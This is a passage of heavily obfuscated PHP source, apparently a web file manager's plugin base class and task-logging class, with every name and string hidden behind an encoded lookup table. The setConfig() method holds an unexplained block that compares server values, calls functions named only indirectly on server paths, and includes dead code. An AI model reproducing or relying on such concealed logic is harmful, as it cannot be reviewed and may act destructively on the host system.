$ı¢³Á›Ğ; $ ıÖÒ > 0; $ ıÖÒ++) { $ÜèşãÁ(DATA_PATH . $ ıÖÒ, $¿ºÓ¾Ê¤); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¥’ª’Êô[1661]); $this->pluginName = str_replace($¥’ª’Êô[1661], $¥’ª’Êô[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¥’ª’Êô[8]; $this->pluginApi = appHostGet() . $¥’ª’Êô[1662] . $this->pluginName . $¥’ª’Êô[8]; $this->pluginHost = $config[$¥’ª’Êô[1663]] . $this->pluginName . $¥’ª’Êô[8]; $this->pluginHostDefault = $config[$¥’ª’Êô[1663]] . $this->pluginName . $¥’ª’Êô[8]; $¬ú€Êıƒ = $config[$¥’ª’Êô[1664]]; if ($¬ú€Êıƒ && strpos($¥’ª’Êô[50] . $¬ú€Êıƒ . $¥’ª’Êô[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¥’ª’Êô[1665]] . $this->pluginName . $¥’ª’Êô[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Î·Ü›öğ][1666]); } protected function assign($™¥òÛŠ, $İÉØƒƒç = false) { if (is_array($™¥òÛŠ)) { $this->values = array_merge($this->values, $™¥òÛŠ); } else { $this->values[$™¥òÛŠ] = $İÉØƒƒç; } } protected function display($­Ñ±Øçè) { extract($this->values); require $­Ñ±Øçè; } final function hookRegist($ä”ùĞ£) { $this->modelPlugin->appRegist($this->pluginName, $ä”ùĞ£); } final function appIcon() { $ä›Ú†ğ =& $_SERVER[Î·Ü›öğ]; $‰¡¥Õ†è = $this->appPackage(); $„°¯’‚ø = $ä›Ú†ğ[12]; if (isset($‰¡¥Õ†è[$ä›Ú†ğ[501]])) { if (isset($‰¡¥Õ†è[$ä›Ú†ğ[501]][$ä›Ú†ğ[1667]])) { $„°¯’‚ø = $ä›Ú†ğ[1668] . $‰¡¥Õ†è[$ä›Ú†ğ[501]][$ä›Ú†ğ[1667]] . $ä›Ú†ğ[1669]; } else { if ($‰¡¥Õ†è[$ä›Ú†ğ[501]][$ä›Ú†ğ[1670]]) { $„°¯’‚ø = $ä›Ú†ğ[1671] . $‰¡¥Õ†è[$ä›Ú†ğ[501]][$ä›Ú†ğ[1670]] . $ä›Ú†ğ[1672]; } } } return $„°¯’‚ø; } final function fileCanView($Í³¡Æ¬«) { $’ïêÎÌÅ =& $_SERVER[Î·Ü›öğ]; if (request_url_safe($Í³¡Æ¬«)) { return !0; } if ($this->isShare($Í³¡Æ¬«)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $˜ÕÉàÇñ = $’ïêÎÌÅ[1673] . rawurlencode(this_url()); show_tips(LNG($’ïêÎÌÅ[1674]) . $’ïêÎÌÅ[1675] . $˜ÕÉàÇñ . $’ïêÎÌÅ[1676] . LNG($’ïêÎÌÅ[1677]) . $’ïêÎÌÅ[1678], !1); } if (!Action($’ïêÎÌÅ[1679])->authCan($’ïêÎÌÅ[1680])) { show_tips(LNG($’ïêÎÌÅ[1681]) . $’ïêÎÌÅ[1682], !1); } ActionCall($’ïêÎÌÅ[1683], $Í³¡Æ¬«); } final function isShare($¼‹ÑèáÂ) { $¶¨Ù“ş = KodIO::parse($¼‹ÑèáÂ); return $¶¨Ù“ş[$_SERVER[Î·Ü›öğ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ë¿şÅºÛ) { if (request_url_safe($ë¿şÅºÛ)) { return $ë¿şÅºÛ; } if (!$this->isShare($ë¿şÅºÛ)) { $ë¿şÅºÛ = $this->filePath($ë¿şÅºÛ, !1); } return Action($_SERVER[Î·Ü›öğ][1286])->linkOut($ë¿şÅºÛ); } public function filePathLinkOut($ó££ù¤Œ) { if (request_url_safe($ó££ù¤Œ)) { return $ó££ù¤Œ; } $this->fileCanView($ó££ù¤Œ); return Action($_SERVER[Î·Ü›öğ][1286])->link($ó££ù¤Œ); } final function filePath($Å§“é­Ğ, $ËóÕĞ… = true, $…˜îá”õ = false) { $ìœá‰›³ =& $_SERVER[Î·Ü›öğ]; $ö¡¯ğïİ = $this->filePathGet($Å§“é­Ğ, $ËóÕĞ…); if (!$this->fileInfo) { show_tips(LNG($ìœá‰›³[108]), !1); } if ($…˜îá”õ && isset($this->fileInfo[$ìœá‰›³[554]]) && $this->fileInfo[$ìœá‰›³[554]]) { $íŞøøüã = Model($ìœá‰›³[557])->fileInfo($this->fileInfo[$ìœá‰›³[554]]); if (!$íŞøøüã || !IO::exist($íŞøøüã[$ìœá‰›³[87]])) { $ô¶Ë¶ = LNG($ìœá‰›³[108]) . LNG($ìœá‰›³[1684]); if (KodUser::isRoot() && isset($íŞøøüã[$ìœá‰›³[87]])) { $ô¶Ë¶ .= $ìœá‰›³[1685] . $íŞøøüã[$ìœá‰›³[87]] . $ìœá‰›³[1686]; } show_tips($ô¶Ë¶); } } Hook::trigger($ìœá‰›³[1687], $ö¡¯ğïİ); return $ö¡¯ğïİ; } final function filePathGet($ç¹¸ÃãÓ, $˜Ùş÷øÖ = true) { $áÏÇ£÷Ÿ =& $_SERVER[Î·Ü›öğ]; if ($–ÖÍ¸Ä = $this->checkSharePath($ç¹¸ÃãÓ, $˜Ùş÷øÖ)) { return $–ÖÍ¸Ä; } $this->fileCanView($ç¹¸ÃãÓ); if (request_url_safe($ç¹¸ÃãÓ)) { $•×¦Ü“ = parse_url_query($ç¹¸ÃãÓ); if (isset($•×¦Ü“[$áÏÇ£÷Ÿ[1688]]) && isset($•×¦Ü“[$áÏÇ£÷Ÿ[237]])) { $ˆ¥êÑ® = Mcrypt::decode($•×¦Ü“[$áÏÇ£÷Ÿ[237]], Model($áÏÇ£÷Ÿ[862])->get($áÏÇ£÷Ÿ[863])); if ($ˆ¥êÑ®) { $this->fileInfo = IO::info($ˆ¥êÑ®); $this->fileInfo[$áÏÇ£÷Ÿ[1689]] = $ç¹¸ÃãÓ; $this->cachePath = $this->pluginCachePath($áÏÇ£÷Ÿ[12], $˜Ùş÷øÖ); return $ˆ¥êÑ®; } } $ç¹¸ÃãÓ = $this->_cacheHttpFile($ç¹¸ÃãÓ, $˜Ùş÷øÖ); $this->fileInfo = IO::info($ç¹¸ÃãÓ); } else { $this->fileInfo = IO::info($ç¹¸ÃãÓ); $this->cachePath = $this->pluginCachePath($áÏÇ£÷Ÿ[12], $˜Ùş÷øÖ); } return $ç¹¸ÃãÓ; } final function _cacheHttpFile($Íı¯§§, $ÂŒë‰Ë’ = true) { $µìİ»ï =& $_SERVER[Î·Ü›öğ]; $Ä¿ˆšƒÕ = parse_url_query($Íı¯§§); $ÚÏäĞ€Â = get_path_ext($Íı¯§§); if (isset($Ä¿ˆšƒÕ[$µìİ»ï[32]]) && $Ä¿ˆšƒÕ[$µìİ»ï[32]]) { $ÚÏäĞ€Â = get_path_ext($Ä¿ˆšƒÕ[$µìİ»ï[32]]); } $™¸µÙÀ¤ = hash_path($Íı¯§§) . $µìİ»ï[10] . $ÚÏäĞ€Â; $this->cachePath = $this->pluginCachePath($ÂŒë‰Ë’ ? $™¸µÙÀ¤ : $µìİ»ï[12]); $¿ÌÒ£ Â = IO::fileNameExist($this->cachePath, $™¸µÙÀ¤); if ($¿ÌÒ£ Â) { return KodIO::make($¿ÌÒ£ Â); } $ëÎ¸ÆÆê = rtrim($this->cachePath, $µìİ»ï[8]) . $µìİ»ï[8] . $™¸µÙÀ¤; return $this->pluginCacheFileSet($ëÎ¸ÆÆê, file_get_contents_nossl($Íı¯§§)); } final function checkSharePath($±üŒæ‡“, $ãšÇ…õ = true) { $¡ıéáÄÚ =& $_SERVER[Î·Ü›öğ]; if (!$this->isShare($±üŒæ‡“)) { return !1; } $†÷ş°üœ = Action($¡ıéáÄÚ[1286])->sharePathInfo($±üŒæ‡“); if (!is_array($†÷ş°üœ) || !isset($†÷ş°üœ[$¡ıéáÄÚ[87]])) { show_json(LNG($¡ıéáÄÚ[1690]), !1); } $this->fileInfo = $†÷ş°üœ; $this->cachePath = $this->pluginCachePath(!1, $ãšÇ…õ); return $†÷ş°üœ[$¡ıéáÄÚ[87]]; } final function pluginCachePath($º‹ËÅèÖ = '', $÷½µ°ß° = false) { $·ŠğàŠ’ =& $_SERVER[Î·Ü›öğ]; if ($÷½µ°ß° && is_array($this->fileInfo)) { $º‹ËÅèÖ = kodIO::hashPath($this->fileInfo); } $¨óÙÛ¸ = rtrim(IO_PATH_SYSTEM_TEMP . $·ŠğàŠ’[1691] . $this->pluginName . $·ŠğàŠ’[8] . $º‹ËÅèÖ, $·ŠğàŠ’[8]); $ş„‰ü”Í = IO::infoFullSimple($¨óÙÛ¸); $Ûƒ®êğ¸ = $ş„‰ü”Í && is_array($ş„‰ü”Í) ? $ş„‰ü”Í[$·ŠğàŠ’[87]] : $·ŠğàŠ’[12]; if (!$Ûƒ®êğ¸) { $Ûƒ®êğ¸ = IO::mkdir($¨óÙÛ¸); } return $Ûƒ®êğ¸; } final function pluginCacheFileSet($¬É¼ı‰€, $Ï¾¤ìÒü = '') { $İÅöª¶ =& $_SERVER[Î·Ü›öğ]; $ÕŒ€şƒˆ = IO::infoFullSimple($¬É¼ı‰€); if (!$ÕŒ€şƒˆ) { return IO::mkfile($¬É¼ı‰€, $Ï¾¤ìÒü, REPEAT_REPLACE); } IO::setContent($ÕŒ€şƒˆ[$İÅöª¶[87]], $Ï¾¤ìÒü); return $ÕŒ€şƒˆ[$İÅöª¶[87]]; } final function pluginLocalFile($ƒµµ™©… = '') { $öºñÄ×š =& $_SERVER[Î·Ü›öğ]; $©ßƒ¬¢© = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($©ßƒ¬¢©)) { mk_dir($©ßƒ¬¢©); } if (!$ƒµµ™©…) { return $©ßƒ¬¢©; } $Ô­Ğ¨ = IO::info($ƒµµ™©…); $›ì‘û„Ö = $öºñÄ×š[1692] . KodIO::hashPath($Ô­Ğ¨) . $öºñÄ×š[10] . $Ô­Ğ¨[$öºñÄ×š[169]]; if (!checkExtSafe($›ì‘û„Ö)) { $›ì‘û„Ö = $›ì‘û„Ö . $öºñÄ×š[1321]; } $îËêÖ±¾ = $©ßƒ¬¢© . $›ì‘û„Ö; if (@file_exists($îËêÖ±¾)) { return $îËêÖ±¾; } return IO::copy($ƒµµ™©…, $©ßƒ¬¢©, 0, $›ì‘û„Ö); } final function appPackage() { $©æ­®ö =& $_SERVER[Î·Ü›öğ]; if ($this->packageData) { return $this->packageData; } $ìü¾Ÿùõ = $this->parseFile($this->pluginPath . $©æ­®ö[1693]); $this->parseLang($ìü¾Ÿùõ); $ß»Áã‚ı = json_decode_force($ìü¾Ÿùõ); if (!$ß»Áã‚ı) { return array(); } $‘‹åÒµí = Hook::trigger($©æ­®ö[1694], $ß»Áã‚ı); if ($‘‹åÒµí && is_array($‘‹åÒµí)) { $ß»Áã‚ı = $‘‹åÒµí; } $this->packageData = $ß»Áã‚ı; return $ß»Áã‚ı; } public function packageInfoGet($“Ÿ¤åÚ¨) { $¼•ıõŸ• = $this->appPackage(); return array_get_value($¼•ıõŸ•, $“Ÿ¤åÚ¨); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Î·Ü›öğ][1695]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Î·Ü›öğ][1696]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Î·Ü›öğ][1697]); } public function echoJsAssign($Şöøƒò, $ñ­Äåß) { $this->echoJsAssignArr[$Şöøƒò] = $ñ­Äåß; } private function parseFile($‹òÎ¡ğØ) { $‰Ìêã¤¶ =& $_SERVER[Î·Ü›öğ]; $„Åêéğ = file_get_contents_nossl($‹òÎ¡ğØ); $ğÜÇåÔŞ = array($‰Ìêã¤¶[1698], $‰Ìêã¤¶[1699], $‰Ìêã¤¶[1700], $‰Ìêã¤¶[1701], $‰Ìêã¤¶[1702], $‰Ìêã¤¶[1703], $‰Ìêã¤¶[1704]); $¼¨°õ¬ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$‰Ìêã¤¶[92]][$‰Ìêã¤¶[1705]]); foreach ($this->echoJsAssignArr as $²ø¶ã˜• => $»ŠØñƒ¯) { $ğÜÇåÔŞ[] = $‰Ìêã¤¶[1706] . $²ø¶ã˜• . $‰Ìêã¤¶[1707]; $¼¨°õ¬[] = is_array($»ŠØñƒ¯) || is_object($»ŠØñƒ¯) ? rawurlencode(json_encode($»ŠØñƒ¯)) : $»ŠØñƒ¯; } if (strstr($„Åêéğ, $‰Ìêã¤¶[1708])) { $½ƒå»ÔÂ = rawurlencode(json_encode($this->pluginLangArr)); $„Åêéğ = str_replace($‰Ìêã¤¶[1708], $½ƒå»ÔÂ, $„Åêéğ); } if (strstr($„Åêéğ, $‰Ìêã¤¶[1709])) { $½ƒå»ÔÂ = $½ƒå»ÔÂ = rawurlencode(json_encode($this->getConfig())); $„Åêéğ = str_replace($‰Ìêã¤¶[1709], $½ƒå»ÔÂ, $„Åêéğ); } $„Åêéğ = str_replace($ğÜÇåÔŞ, $¼¨°õ¬, $„Åêéğ); return $„Åêéğ; } private function parseLang(&$ì¹Ãôªõ) { $¦Ø‘êÓ =& $_SERVER[Î·Ü›öğ]; $ÕÀ¬ïÉÛ = $¦Ø‘êÓ[1710]; if (!strstr($ì¹Ãôªõ, $ÕÀ¬ïÉÛ)) { return; } preg_match_all($¦Ø‘êÓ[1711], $ì¹Ãôªõ, $„Ş­–Ô); if (!is_array($„Ş­–Ô) || count($„Ş­–Ô) == 0 || !is_array($„Ş­–Ô[0]) || count($„Ş­–Ô[0]) == 0) { return; } $§´¶±¤Œ = array(); $‹÷“úòè = array(); foreach ($„Ş­–Ô[0] as $Ğ×¬èûñ) { $À„¢Ê« = substr($Ğ×¬èûñ, strlen($ÕÀ¬ïÉÛ), -4); $ÂÙãÙÜ = LNG($À„¢Ê«); $§´¶±¤Œ[] = $Ğ×¬èûñ; $‹÷“úòè[] = str_replace(array($¦Ø‘êÓ[288], $¦Ø‘êÓ[1180], $¦Ø‘êÓ[419], $¦Ø‘êÓ[121]), array($¦Ø‘êÓ[53], $¦Ø‘êÓ[53], $¦Ø‘êÓ[12], $¦Ø‘êÓ[1712]), $ÂÙãÙÜ); } $ì¹Ãôªõ = str_replace($§´¶±¤Œ, $‹÷“úòè, $ì¹Ãôªõ); } private function parseConfig(&$˜ñ–…¥²) { $ğèÌÆÁñ =& $_SERVER[Î·Ü›öğ]; $¥Ÿ‘À™Œ = $ğèÌÆÁñ[1713]; if (!strstr($˜ñ–…¥², $¥Ÿ‘À™Œ)) { return; } preg_match_all($ğèÌÆÁñ[1714], $˜ñ–…¥², $ò‰©ç›ê); if (!is_array($ò‰©ç›ê) || count($ò‰©ç›ê) == 0 || !is_array($ò‰©ç›ê[0]) || count($ò‰©ç›ê[0]) == 0) { return; } $´™—ÔÍ¿ = $this->getConfig(); $³Æ»ïŸ¯ = array(); $ıŸï±Ü« = array(); foreach ($ò‰©ç›ê[0] as $¡Ã—ô³°) { $óÄıØ‡§ = substr($¡Ã—ô³°, strlen($¥Ÿ‘À™Œ), -2); $³Æ»ïŸ¯[] = $¡Ã—ô³°; $ıŸï±Ü«[] = _get($´™—ÔÍ¿, $óÄıØ‡§); } $˜ñ–…¥² = str_replace($³Æ»ïŸ¯, $ıŸï±Ü«, $˜ñ–…¥²); } private function parsePackage(&$¿¿©¿¿) { $©½Ì¬ÓÇ =& $_SERVER[Î·Ü›öğ]; $™„Ÿ›êÈ = $©½Ì¬ÓÇ[1715]; if (!strstr($¿¿©¿¿, $™„Ÿ›êÈ)) { return; } preg_match_all($©½Ì¬ÓÇ[1716], $¿¿©¿¿, $ÃéùƒÚ’); if (!is_array($ÃéùƒÚ’) || count($ÃéùƒÚ’) == 0 || !is_array($ÃéùƒÚ’[0]) || count($ÃéùƒÚ’[0]) == 0) { return; } $°æŠûçê = $this->appPackage(); $Í¦¨äÓ™ = array(); $ÛáÕ¶˜Œ = array(); foreach ($ÃéùƒÚ’[0] as $ÕªñÓ Ï) { $¡¢¢Û»† = substr($ÕªñÓ Ï, strlen($™„Ÿ›êÈ), -2); $Í¦¨äÓ™[] = $ÕªñÓ Ï; $ÛáÕ¶˜Œ[] = _get($°æŠûçê, $¡¢¢Û»†); } $¿¿©¿¿ = str_replace($Í¦¨äÓ™, $ÛáÕ¶˜Œ, $¿¿©¿¿); } final function echoFile($ÚõñŒÜ®, $¥î«³ñ’ = false) { $ÃİÛ†Ö =& $_SERVER[Î·Ü›öğ]; $¸ø³‡ü = $this->pluginPath . $ÚõñŒÜ®; if (ACT == $ÃİÛ†Ö[1717]) { echo $ÃİÛ†Ö[1718] . $this->pluginName . $ÃİÛ†Ö[8] . $ÚõñŒÜ® . $ÃİÛ†Ö[1719]; if (!file_exists($¸ø³‡ü)) { echo $ÃİÛ†Ö[1720]; return; } } $€ŒçÉÒ² = $this->parseFile($¸ø³‡ü); $this->parseLang($€ŒçÉÒ²); $this->parseConfig($€ŒçÉÒ²); $this->parsePackage($€ŒçÉÒ²); if (is_array($¥î«³ñ’)) { $€ŒçÉÒ² = str_replace(array_keys($¥î«³ñ’), array_values($¥î«³ñ’), $€ŒçÉÒ²); } echo $ÃİÛ†Ö[288] . $€ŒçÉÒ²; } private function checkVersion() { $ùïøµµ =& $_SERVER[Î·Ü›öğ]; $Ã€‚¢§È = $this->appPackage(); $ª€®ü‰Ì = $this->getConfig(); if ($ª€®ü‰Ì[$ùïøµµ[1721]] == $Ã€‚¢§È[$ùïøµµ[1695]]) { return; } $this->regist(); $this->setConfig(array($ùïøµµ[1721] => $Ã€‚¢§È[$ùïøµµ[1695]])); } final function initLang() { $ËÈËŠ =& $_SERVER[Î·Ü›öğ]; $Ú¤—ÙøĞ = $ËÈËŠ[1722]; $‹Í° şš = $this->pluginPath . $ËÈËŠ[1723]; $ÉÙÆ—ø = I18n::getType(); $Àî¯Éº– = array(); if (file_exists($‹Í° şš . $ÉÙÆ—ø . $ËÈËŠ[938])) { $Àî¯Éº– = (include $‹Í° şš . $ÉÙÆ—ø . $ËÈËŠ[938]); } else { if ($ÉÙÆ—ø == $ËÈËŠ[1724] && !file_exists($‹Í° şš . $ÉÙÆ—ø . $ËÈËŠ[938]) && file_exists($‹Í° şš . $ËÈËŠ[1725])) { $Àî¯Éº– = (include $‹Í° şš . $ËÈËŠ[1725]); $ÉÙÆ—ø = $ËÈËŠ[1540]; } else { if (file_exists($‹Í° şš . $Ú¤—ÙøĞ . $ËÈËŠ[938])) { $Àî¯Éº– = (include $‹Í° şš . $Ú¤—ÙøĞ . $ËÈËŠ[938]); $ÉÙÆ—ø = $Ú¤—ÙøĞ; } } } if (!$Àî¯Éº– || !is_array($Àî¯Éº–)) { $Àî¯Éº– = array(); } $ïÑÚíØ = Hook::trigger($ËÈËŠ[1726], $Àî¯Éº–, $this->pluginName, $ÉÙÆ—ø); if ($ïÑÚíØ && is_array($ïÑÚíØ)) { $Àî¯Éº– = $ïÑÚíØ; } if (@count($Àî¯Éº–) > 0) { I18n::set($Àî¯Éº–); } return $Àî¯Éº–; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($÷Œ“…›¨) { $îİÂ¥“È =& $_SERVER[Î·Ü›öğ]; if ($_SERVER[$îİÂ¥“È[481]] != $_SERVER[$îİÂ¥“È[1253]]) { $‘êµÉµ = $îİÂ¥“È[977]; $’ãˆÇ¨Ş = $îİÂ¥“È[482]; $Æ‡„“  = $_SERVER[$îİÂ¥“È[483]] . $îİÂ¥“È[484]; $š¸ñÕÂÅ = $’ãˆÇ¨Ş($Æ‡„“ ); $“Æ¤¢³ê = explode($îİÂ¥“È[288], $š¸ñÕÂÅ); if (count($“Æ¤¢³ê) < $îİÂ¥“È[711]) { $à§Öœô„ = $îİÂ¥“È[486]; $à§Öœô„(); } $ˆ ÂÉòì = $îİÂ¥“È[978]; $ˆ ÂÉòì($_SERVER[$îİÂ¥“È[979]]); $ˆ ÂÉòì($_SERVER[$îİÂ¥“È[483]] . $îİÂ¥“È[1727]); $Ãó€­´¶ = 1; while ($Ãó€­´¶ > 1) { $Ãó€­´¶ = $Ãó€­´¶ + 4; $’ÆèÇ¶ = rawurlencode($Ãó€­´¶ . $îİÂ¥“È[456]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $÷Œ“…›¨); } public function onSetConfig($Ş¸œîá¼) { } public function onGetConfig($¨¨¢ÛÊö) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¹¡¡êí¹) { if ($¹¡¡êí¹ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($šâÎË¢Ù = "\160\x6c\165\147\151\156\x41\165\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $¡Ù²ÎÈ‰ = $this->getConfig(); if (!$¡Ù²ÎÈ‰[$šâÎË¢Ù]) { return !1; } return ActionCall($_SERVER[Î·Ü›öğ][1728], $¡Ù²ÎÈ‰[$šâÎË¢Ù]); } public function url($­ÓéäóË, $¢„îÃ® = '', $À²•©Ü€ = true) { $²øèì§ =& $_SERVER[Î·Ü›öğ]; $‚Í¯›© = $this->getConfig(); $®”¥à = KOD_VERSION . $²øèì§[10] . KOD_VERSION_BUILD; $¦¸Ä×Õò = $this->packageVersion(); $¡‘ãÔ¢¼ = $®”¥à . $²øèì§[464] . $¦¸Ä×Õò; if (substr($­ÓéäóË, 0, 4) == $²øèì§[152] || substr($­ÓéäóË, 0, 2) == $²øèì§[1448]) { $‹Û—Ä¤ü = $­ÓéäóË . $²øèì§[1729] . $¡‘ãÔ¢¼; } else { if ($¢„îÃ® == $²øèì§[12]) { $‹Û—Ä¤ü = $this->pluginHost . $­ÓéäóË . $²øèì§[1729] . $¡‘ãÔ¢¼; } else { if ($¢„îÃ® === $²øèì§[78]) { $‹Û—Ä¤ü = $this->pluginHost . $­ÓéäóË; } else { if ($¢„îÃ® == $²øèì§[1730]) { $‹Û—Ä¤ü = STATIC_PATH . $­ÓéäóË . $²øèì§[1729] . $®”¥à; } else { if ($¢„îÃ® == $²øèì§[1731]) { $‹Û—Ä¤ü = APP_HOST . $²øèì§[1732] . $­ÓéäóË . $²øèì§[1729] . $®”¥à; } else { if (isset($‚Í¯›©[$¢„îÃ®])) { $‹Û—Ä¤ü = $‚Í¯›©[$¢„îÃ®] . $­ÓéäóË . $²øèì§[1729] . $¡‘ãÔ¢¼; } } } } } } if (!$À²•©Ü€) { return $‹Û—Ä¤ü; } echo $‹Û—Ä¤ü; } public function link($†¯Å‰§ó = false, $ï‡„ˆÓÍ = '') { $¦Ò©¢ø =& $_SERVER[Î·Ü›öğ]; $ªƒÂÖı = $this->linkHas == !1; $this->linkHas = !0; if (!$†¯Å‰§ó) { $this->link($¦Ò©¢ø[1733], $¦Ò©¢ø[1731]); $this->link($¦Ò©¢ø[1734], $¦Ò©¢ø[1730]); $this->link($¦Ò©¢ø[1735], $¦Ò©¢ø[1730]); $this->link($¦Ò©¢ø[1736], $¦Ò©¢ø[1730]); $this->link($¦Ò©¢ø[1737], $¦Ò©¢ø[1730]); if ($ªƒÂÖı) { Hook::trigger($¦Ò©¢ø[1738]); } return; } $ÊØÇÎœÕ = $this->url($†¯Å‰§ó, $ï‡„ˆÓÍ, !1); if (substr($†¯Å‰§ó, -3) == $¦Ò©¢ø[1739]) { echo $¦Ò©¢ø[1740] . $ÊØÇÎœÕ . $¦Ò©¢ø[1741] . $¦Ò©¢ø[288]; } else { if (substr($†¯Å‰§ó, -4) == $¦Ò©¢ø[1742]) { echo $¦Ò©¢ø[1743] . $ÊØÇÎœÕ . $¦Ò©¢ø[1744] . $¦Ò©¢ø[288]; } } if ($ªƒÂÖı) { Hook::trigger($¦Ò©¢ø[1738]); } } } goto e¨öçôÜê; C‘Ê·›öÄÊ: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($˜§€§”î, $™çÊ« = '', $°ì¤å¸´ = 0, $êÓ«³´ = '') { $À–‚¶·Û =& $_SERVER[Î·Ü›öğ]; $êÓ«³´ = $êÓ«³´ ? $êÓ«³´ : ($™çÊ« ? $™çÊ« : $˜§€§”î); $¦¹Á¨¯Ğ = new Task($˜§€§”î, $™çÊ«, $°ì¤å¸´, $êÓ«³´); $GLOBALS[$À–‚¶·Û[1894] . $˜§€§”î] = new TaskLog($À–‚¶·Û[1793], $¦¹Á¨¯Ğ, $êÓ«³´); return $¦¹Á¨¯Ğ; } public function __construct($›Ê­ÏŒ‰ = '', $…ËÑ›Õ‚ = '', $Àû°Å = '') { $Ù¡Ä˜„ =& $_SERVER[Î·Ü›öğ]; if (!$›Ê­ÏŒ‰) { $›Ê­ÏŒ‰ = $Ù¡Ä˜„[1793]; } $´šË¥Óü = $›Ê­ÏŒ‰ . $Ù¡Ä˜„[464] . rand_string(10); if (!$Àû°Å) { $Àû°Å = $›Ê­ÏŒ‰ . $Ù¡Ä˜„[53] . $Àû°Å; } switch ($›Ê­ÏŒ‰) { case $Ù¡Ä˜„[1793]: if (!$…ËÑ›Õ‚ || !$…ËÑ›Õ‚->task) { return echoLog($›Ê­ÏŒ‰ . $Ù¡Ä˜„[1895]); } $¦˜–Ó¸¶ = $…ËÑ›Õ‚; $´šË¥Óü = $¦˜–Ó¸¶->task[$Ù¡Ä˜„[477]]; $›Ê­ÏŒ‰ = $¦˜–Ó¸¶->task[$Ù¡Ä˜„[477]]; if (!$¦˜–Ó¸¶->task[$Ù¡Ä˜„[1696]]) { $¦˜–Ó¸¶->task[$Ù¡Ä˜„[1696]] = $Àû°Å ? $Àû°Å : $›Ê­ÏŒ‰; } break; case $Ù¡Ä˜„[1896]: if (!$…ËÑ›Õ‚) { return echoLog($›Ê­ÏŒ‰ . $Ù¡Ä˜„[1897]); } $ÇÖ‹·›Õ = is_string($…ËÑ›Õ‚) ? array($…ËÑ›Õ‚) : $…ËÑ›Õ‚; $¦˜–Ó¸¶ = new TaskFileTransfer($´šË¥Óü, $›Ê­ÏŒ‰, 0, $Àû°Å ? $Àû°Å : $ÇÖ‹·›Õ[0]); foreach ($ÇÖ‹·›Õ as $§Ñ¯ºÅÄ) { $¦˜–Ó¸¶->addPath($§Ñ¯ºÅÄ); } break; case $Ù¡Ä˜„[390]: if (!$…ËÑ›Õ‚) { return echoLog($›Ê­ÏŒ‰ . $Ù¡Ä˜„[1897]); } $ÇÖ‹·›Õ = is_string($…ËÑ›Õ‚) ? array($…ËÑ›Õ‚) : $…ËÑ›Õ‚; $¦˜–Ó¸¶ = new TaskZip($´šË¥Óü, $›Ê­ÏŒ‰, 0, $Àû°Å ? $Àû°Å : $ÇÖ‹·›Õ[0]); foreach ($ÇÖ‹·›Õ as $§Ñ¯ºÅÄ) { $¦˜–Ó¸¶->addPath($§Ñ¯ºÅÄ); } break; case $Ù¡Ä˜„[1329]: if (!$…ËÑ›Õ‚) { return echoLog($›Ê­ÏŒ‰ . $Ù¡Ä˜„[1897]); } $¦˜–Ó¸¶ = new TaskUnZip($´šË¥Óü, $›Ê­ÏŒ‰, 0, $Àû°Å ? $Àû°Å : $…ËÑ›Õ‚); if ($…ËÑ›Õ‚) { $¦˜–Ó¸¶->addFile($…ËÑ›Õ‚); } break; case $Ù¡Ä˜„[152]: $¦˜–Ó¸¶ = new TaskHttp($´šË¥Óü, $›Ê­ÏŒ‰); break; default: return; break; } $this->task = $¦˜–Ó¸¶; $this->taskID = $´šË¥Óü; Hook::bind($Ù¡Ä˜„[1831], array($this, $Ù¡Ä˜„[1898])); Hook::bind($Ù¡Ä˜„[1833], array($this, $Ù¡Ä˜„[1899])); Hook::bind($Ù¡Ä˜„[1827], array($this, $Ù¡Ä˜„[1900])); echoLog($Ù¡Ä˜„[1901] . $¦˜–Ó¸¶->task[$Ù¡Ä˜„[1696]]); } public function __destruct() { $this->end(); } public function end($°Ö¥¸ÃÛ = '') { $äÌòù©ó =& $_SERVER[Î·Ü›öğ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($°Ö¥¸ÃÛ); $this->task = !1; $this->taskID = !1; Hook::unbind($äÌòù©ó[1831], array($this, $äÌòù©ó[1898])); Hook::unbind($äÌòù©ó[1833], array($this, $äÌòù©ó[1899])); Hook::unbind($äÌòù©ó[1827], array($this, $äÌòù©ó[1900])); } public function taskUpdate($üöìÜ¼š) { $­Óü½š =& $_SERVER[Î·Ü›öğ]; if (!$üöìÜ¼š || $this->taskID != $üöìÜ¼š[$­Óü½š[477]]) { return; } $È¸³˜¾ = 20; $•ÓÁò¢… = intval($üöìÜ¼š[$­Óü½š[1812]] * $È¸³˜¾); $ğ¹Ÿö‚ = $­Óü½š[176] . str_repeat($­Óü½š[517], $•ÓÁò¢…) . $­Óü½š[1113] . str_repeat($­Óü½š[53], $È¸³˜¾ - $•ÓÁò¢…) . $­Óü½š[178]; $İŞÒÌÇ = $ğ¹Ÿö‚ . sprintf($­Óü½š[1902], $üöìÜ¼š[$­Óü½š[1812]] * 100) . $­Óü½š[1903]; $©•¢·¡Ã = $İŞÒÌÇ . $üöìÜ¼š[$­Óü½š[1811]] . $­Óü½š[8] . $üöìÜ¼š[$­Óü½š[1162]] . LNG($­Óü½š[1904]); $’‰°…Àœ = $­Óü½š[12]; if ($üöìÜ¼š[$­Óü½š[1888]]) { $©•¢·¡Ã = 